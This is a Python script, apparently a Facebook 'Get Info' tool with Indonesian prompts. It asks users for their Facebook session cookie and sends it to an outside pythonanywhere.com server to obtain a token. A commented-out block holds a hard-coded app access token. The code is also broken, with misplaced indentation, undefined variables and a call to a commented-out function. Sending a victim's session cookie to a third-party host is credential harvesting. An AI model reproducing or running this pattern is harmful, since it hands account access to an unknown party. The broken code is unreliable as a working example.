#!/usr/bin/python3
#coding=utf-8
# Developed By : Denventa And Merch Elz
# Coded By     : Denventa Afriliyan Ferly Shishigami X [ A-Haganezuka ]
# A-Haganezuka [ Denventa Afriliyan Ferly Shishigami X - Haganezuka ]
# Recode?, Boleh Asal Cantumkan Nama Author

import requests as r, json, os
from requests.exceptions import ConnectionError

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

a = '\033[1;30m'; m = '\033[1;31m'; h = '\033[1;32m'; p = '\033[1;37m'; k = '\033[1;33m'; s = '\033[1;35m'
def get_token(cookie):
    api = r.get('http://dvandenpolph.pythonanywhere.com/token?cookie='+ cookie).json()
    if 'True' in api['status']:
        # stalk(api)
        eaam(api['cookie'])
    else:
        exit(f'{m}INFO!{p} Cookies Invalid')

def stalk(data):
    cok = {'cookie':data['cookie']}
    json = {}
    os.system('clear')
    api = r.get('https://graph.facebook.com/me?fields=id,name,gender,location,birthday&access_token='+ data['eaab'], cookies=cok).json()
    tc = r.get('https://graph.facebook.com/me/friends?fields=id&limit=5000&access_token='+ data['eaab'], cookies=cok).json()['summary']['total_count']
    for req in ['id', 'name', 'gender', 'location', 'birthday']:
        try:
            json.update({req:api[req]})
        except:json.update({req:m+'None'})
         
class logo:
  def logo_saya(self):
            my_logo = f""" 
  {O2}________        __    {P2}.___        _____       
 {O2}/  _____/  _____/  |_  {P2}|   | _____/ ____\____  
{O2}/   \  ____/ __ \   __\ {P2}|   |/    \   __\/  _ \ 
{O2}\    \_\  \  ___/|  |   {P2}|   |   |  \  | (  <_> )
 {O2}\______  /\___  >__|   {P2}|___|___|  /__|  \____/ 
        {O2}\/     \/   Face{P2}book     \/"""
    print(f'{a}[{m}*{a}]{p} Facebook Name: {k}'+ json['name'])
    print(f'{a}[{m}*{a}]{p} Facebook ID: {k}'+ json['id'])
    print(f'{a}[{m}*{a}]{p} Gender: {k}'+ json['gender'])
    print(f'{a}[{m}*{a}]{p} Location: {k}'+ json['location'])
    print(f'{a}[{m}*{a}]{p} Birthday: {k}'+ json['birthday'])
    print(f'{a}[{m}*{a}]{p} Friends Count: {k}'+ str(tc))

# def eaam(cookie):
    # cok = {'cookie':cookie}
    # with r.Session() as deira:
        # api = deira.post('https://graph.facebook.com/v2.6/device/login/', data={'access_token':'867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01', 'scope':''}, headers={'content-type':'application/x-www-form-urlencoded'}).json()
        # code = api['code']
        # user_code = api['user_code']
        # api2 = deira.post('https://m.facebook.com/device?user_code='+ api['user_code'], cookies=cok, headers={'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document'}).text
        # if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
            # exit(f'{m}INFO!{p} Cookie Invalid')
        # else:
            
    


if __name__=='__main__':
    os.system('clear')
    print(p +'Silahkan Masukan Cookie Akun Facebook Anda Untuk Mendapatkan Informasi Akun Facebook Anda.')
    get_token(input(f'\n{a}[{m}?{a}]{p} Cookies:{h} '))
